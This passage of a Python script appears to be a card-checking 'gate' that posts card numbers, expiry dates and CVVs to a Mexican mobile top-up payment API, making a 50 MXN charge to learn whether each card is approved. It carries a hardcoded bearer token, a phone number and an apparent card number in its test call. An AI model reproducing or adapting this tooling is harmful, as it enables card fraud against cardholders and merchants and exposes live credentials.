                'authorization': 'Bearer eyJhbGciOiJIUzI1NiJ9.eyJhcGlfaWQiOiI5ZGY5ZjQyYi0zYTIyLTQwYWItOTJiMy05OGY0NGM0ZDM5Y2QifQ.Vx-lFf6dwP2mYUrmqLTQLG9EP27kO5ciWk-gqZJSXW8',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://recarga.mimovil.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://recarga.mimovil.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            data = {
                'msisdn': '5586396888',
                'amount': '50',
                'service_type': 'mbb',
                'offering_id': '1853',
                'payment[payment_method]': 'card',
                'payment[external_id]': 'ffdebb49-af87-4b1e-aad7-0e0eb51bae6d',
                'payment[customer_name]': name+last,
                'payment[customer_email]': email,
                'payment_card[openpay_device_session_id]': 'R1XJ0cd2FZ8oBR4cWy5HgKEopw2CGvzW',
                'payment_card[stripe_token]': tokenkst,
                'payment_card[kushki_token]': tokenkus,
                'payment_card[beel_secure_fields]': 'FX5QcyJzVhHEE0xhhYliU9xGdnWKaj+cK2MzNOTFobmCX5T5zfRwZ8Q76dFT6vwt6N8cxf2IxcGi939HUnoK66jks7emFHI2d00tVHTtQevokcgW4pr86hJgRuUkvV0Fi/NhqjMsI/zXvYkAbl7X7IqTYGl%5TLxTvyC1fCy7KfNPHgYtzbBxmR3y2LAuWd7mAXEqAjC+HvdXMtMQDSV3zEHRT61KxlaXnsdNUyvZlr52FPZf4AQNMb1U3bpZqUC9YSUvMdd5NCkS7u3jxu/nqqOqb+skjCMt8qp57RWJ1kqGxLi3FLn0KcED+ujEaSw4Vvgh+Gf3q6bH3B9AAyu7qRS/m4nkUQM6QsxMIAIX/tiUEesk6f1aklWFGiPDfjVkQwFyc5O+P6eMY4j9MZrKRoj20vqvtK2Pbr3TXWwYi3buRHadBgKBOQ3Cesr/EHObieqyfZQeIGpOjdEQFgoPdj67YqhsvtIk2BMjxZs9TfQGpbb41ubTTmwVJSQwe24bYMPVzb0f3X4EsKdBCtb9oA902o37S83WjItnhCJW1No9is3U57+mPmT698lcM7ohU9EcAIpKCLZQCQcwdBJ0482+asCwLVXyuaL/5vVBBxK1lRLw8d8JfyvcJZ7Dkj0ymWVfGUxS9QFyKiIgQzjjI1HivEMct4GTvRR5RB3b1B/0=',
                'payment_card[card_cvv]': cvv,
                'payment_card[recurring_payments]': ''
            }

            response = c.post(
                'https://compartcarga.api.koonolmexico.com/tenants/2/payments',
                headers=headers,
                data=data
            )
            time.sleep(3)
            responsePm = json.loads(response.text)
            #tokenop = responsePm['id']
            print(responsePm)

            print(response.status_code)
            print(response.text)

            soup = b(response.text, 'html.parser')
            response_text = soup.text.strip()

            
           
            print(response_text)

            # Primero verificar si hay un pago
            if "payment" in responsePm:
                payment = responsePm["payment"]
                status = payment.get("status", "").lower()

                if status == "completed":
                    amount = payment.get("amount", "0")
                    payment_gateway = payment.get("payment_gateway", "desconocido").upper()
                    payment_id = payment.get("payment_gateway_id", "N/A")

                    mensaje = (
                        f"✅ Pago aprobado\n"
                        f"💵 Monto: ${amount} MXN\n"
                        f"🏦 Procesador: {payment_gateway}\n"
                        f"🆔 ID de Pago: {payment_id}"
                    )
                    return mensaje
                else:
                    return f"⚠️ Estado del pago: {status.capitalize()}"

            # Si no hay pago, buscar si hay error
            elif "message" in responsePm:
                try:
                    error_data = json.loads(responsePm["message"])
                    description = error_data.get("description", "Error desconocido")
                    mensaje = f"[❌] Pago rechazado: {description}"
                except json.JSONDecodeError:
                    mensaje = f"[❌] Error inesperado: {responsePm['message']}"
                return mensaje

            # Si no es pago ni error
            else:
                return "❓ No se encontró información de pago."



          

                    
           
            

        
            
        except Exception as e:
            print(e)
            retry_count += 1
    else:
        return {"card": card, "status": "ERROR", "resp":  f"Retries: {retry_count}"}
    

if __name__ == "__main__":
    print(ccn_gate("5579100425156526|05|2029|688"))